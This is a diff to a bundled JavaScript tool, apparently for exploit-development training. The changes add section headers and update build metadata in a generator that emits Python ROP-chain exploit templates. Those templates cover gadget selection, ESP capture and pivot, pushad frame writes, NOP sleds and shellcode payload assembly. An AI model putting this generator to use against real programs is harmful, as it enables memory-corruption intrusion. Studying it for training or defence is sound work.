@@ -12107,10 +12107,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-22T12:13:54.536Z" : globalThis[key2];
+        value = true ? "2026-11-22T12:23:41.979Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "c412b41280bd" : globalThis[key2];
+        value = true ? "1048da574845" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -14520,6 +14520,7 @@ var osed_bundle = (() => {
       holes.push(`${target}: ${how}`);
       return [{ line: `# ${target}: ${how}` }, { line: `${target} = hole(${JSON.stringify(target)})` }];
     };
+    const group = (title) => ({ line: `#-- ${title}` });
     const usable = (gadget, keep, own) => !movesEsp(gadget) && memoryWrites(gadget, "").length === 0 && writtenRegisters(gadget).every((register2) => own.indexOf(register2) >= 0 || keep.indexOf(register2) < 0);
     const popGadget = (register2, keep) => rankCandidates(gadgets.filter((gadget) => {
       var _a3;
@@ -14706,6 +14707,7 @@ var osed_bundle = (() => {
         chain.push(...hole("c", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain by hand"));
       } else {
         const fns = frame.map((slot2) => literal2(slot2) ? void 0 : defineLoader(slot2, valueRegister, [field]));
+        chain.push(group("the captured ESP, and the address of field 1"));
         chain.push({ line: `# ${field} = field 1 - ${hex5(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
         chain.push({ line: `# confirm: bp ${hex5(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
         chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
@@ -14722,6 +14724,7 @@ var osed_bundle = (() => {
           const fn = fns[i];
           if (!fn)
             return;
+          chain.push(group(`field ${i + 1}: ${slot2.name}`));
           if (i > at) {
             const there = advance ? moveOps(field, (_a3 = advance.at.dest) != null ? _a3 : field, []) : void 0;
             const back = advance ? moveOps((_b2 = advance.at.dest) != null ? _b2 : field, field, []) : void 0;
@@ -14732,7 +14735,7 @@ var osed_bundle = (() => {
             at = i;
           }
           const args = slot2.source.kind === "shellcode" ? `c, ${i + 1}` : slot2.source.kind === "size" ? "c, size" : "c";
-          chain.push({ line: `${fn}(${args})${" ".repeat(Math.max(1, 30 - fn.length - args.length))}# field ${i + 1}: ${slot2.name}` });
+          chain.push({ line: `${fn}(${args})` });
           chain.push({ call: entry(write2.gadget, "write the field"), values: [] });
         });
         const pops = popsAfterPivot(pivot.gadget);
@@ -14740,6 +14743,7 @@ var osed_bundle = (() => {
         const toValue = moveOps(field, valueRegister, []);
         const math = arithmetic(valueRegister, []);
         const toPivot = moveOps(valueRegister, (_g = pivot.at.source) != null ? _g : "", []);
+        chain.push(group("pivot: ESP onto field 1"));
         chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex5(4 * pops)}, so the ret after the pivot lands on field 1` });
         if (!toValue || !math || !toPivot)
           chain.push(...hole("pivot_value", `no way to move the field address into ${pivot.at.source}`));
@@ -14751,7 +14755,7 @@ var osed_bundle = (() => {
         }
         chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
         const sub = ((_h = arithmetic(valueRegister, [field])) == null ? void 0 : _h.sub) !== false;
-        chain.push({ line: "" }, { line: "chain_end = OFFSET + 4 * len(c)" }, { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` }, { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex5(writeOffset)}` : ""})` }, { line: `    return ${sub ? "neg(distance)" : "distance"}` }, { line: "gap = 0x40" }, { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" }, { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" }, { line: "" }, { line: 'payload  = b"A" * FRAME_AT + frame + b"".join(p32(w) for w in c)' }, { line: 'payload += b"C" * gap + nops + shellcode' });
+        chain.push({ line: "" }, group("the shellcode address, into the fields the loaders marked"), { line: "chain_end = OFFSET + 4 * len(c)" }, { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` }, { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex5(writeOffset)}` : ""})` }, { line: `    return ${sub ? "neg(distance)" : "distance"}` }, { line: "gap = 0x40" }, { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" }, { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" }, { line: "" }, { line: 'payload  = b"A" * FRAME_AT + frame + b"".join(p32(w) for w in c)' }, { line: 'payload += b"C" * gap + nops + shellcode' });
       }
     } else {
       const slots = PUSHAD_FRAMES[api];
@@ -14764,7 +14768,9 @@ var osed_bundle = (() => {
       });
       frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot2) => `${slot2.register} = ${slot2.name}`).join(", ")}`];
       const dispatch = pick2("pushad");
+      chain.push(group("the seven registers, in the order [6/7] fixes"));
       chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
+      chain.push(group("dispatch: pushad writes the whole frame at once"));
       if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
         chain.push({ line: `# ${input.module} has no clean pushad ; ret. This one is ${sequence(dispatch.gadget)}: everything after the pushad has to survive, or the chain dies before the ret.` });
       }
@@ -14780,12 +14786,15 @@ var osed_bundle = (() => {
         else if (slot2.source.kind === "named" && known)
           tail.push(slot2.source.name);
         else {
+          chain.push(group(`${slot2.name}: a dword after the pushad gadget, not a register`));
           chain.push(...load(slot2, "eax", loaded));
           tail.push(`${ident(slot2.name)}_value`);
         }
       }
-      if (tail.length > 0)
-        chain.push({ line: `c.extend([${tail.join(", ")}])     # the dwords the call reads after the pushad gadget` });
+      if (tail.length > 0) {
+        chain.push(group("the dwords the call reads after the pushad gadget"));
+        chain.push({ line: `c.extend([${tail.join(", ")}])` });
+      }
       chain.push({ line: "" }, { line: 'payload = b"A" * OFFSET + b"".join(p32(w) for w in c) + nops + shellcode' });
     }
     assignNames(table2);
